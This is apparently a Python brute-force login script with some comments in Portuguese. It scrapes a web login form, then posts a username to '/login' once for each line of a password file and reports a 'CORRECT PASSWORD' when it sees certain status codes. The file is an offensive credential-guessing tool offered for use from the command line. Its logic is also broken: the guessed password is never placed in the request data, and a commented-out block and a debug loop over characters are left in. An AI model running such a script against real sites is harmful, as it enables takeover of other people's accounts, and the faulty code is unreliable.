import requests
import sys
import time
import json
from bs4 import BeautifulSoup

def login(url: str, username: str, password_file: str) -> None:
    print(password_file)
    response = requests.get(url)

    # Verifique se a solicitação GET foi bem-sucedida (código de status 200)
    if response.status_code != 200:
        print(f"Failed to access the URL: {url}")
        return

    time.sleep(2)
    soup = BeautifulSoup(response.text, 'html.parser')
    form = soup.find("form", {"id": "form_login"})



    action_url = '/login'

    inputs = form.find_all("input")

    data_passwords = []
    data = {}
    for input_field in inputs:
        if input_field.get("name"):
            data[input_field.get("name")] = input_field.get("value", "")

    with open(password_file, 'r') as file:
        """lines = file.readline()

        for line in lines:
            # Remove espaços em branco no início e no final da linha
            line = line.strip()
            # Divide a linha em palavras (separadas por espaços em branco)
            words = line.split()
            if words:
                # A primeira palavra (entre aspas) estará em words[0]
                first_word = words[0]
                print([first_word])"""



        for password in file:

            password = password.strip()
            data_unclean = password
            data_unclean = data_unclean[1: len(data_unclean)-1]
            indice_ultima_aspa = data_unclean.rfind('"')
            data_clean = data_unclean[indice_ultima_aspa+1:]
            data_passwords = [data_clean]

            if data_passwords[0] != '':
                for i in data_passwords[0]:
                    data_passwords.append(i)
                    print(data_passwords)
            data["username"] = username

            response = requests.post(url + action_url, data=data, allow_redirects=False)


            # Verifique o código de status HTTP
            if response.status_code == 204 or response.status_code == 200 or response.status_code == 304:
                print(f"[+] Username: {data['username']}, Password: {data_passwords[0]} - CORRECT PASSWORD!!")
                return
            elif data_passwords[0] == "":
                pass
            elif response.status_code == 405:
                print(f"[-] Username: {data['username']}, Password: {data_passwords[0]} - FAILED PASSWORD")
                pass
            else:
                print("No found the correct password. :´(")


if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Uso: python main.py <URL> <Username> <File Password>")
        sys.exit(1)

    url = sys.argv[1]
    username = sys.argv[2]
    password_file = sys.argv[3]


    login(url, username, password_file)

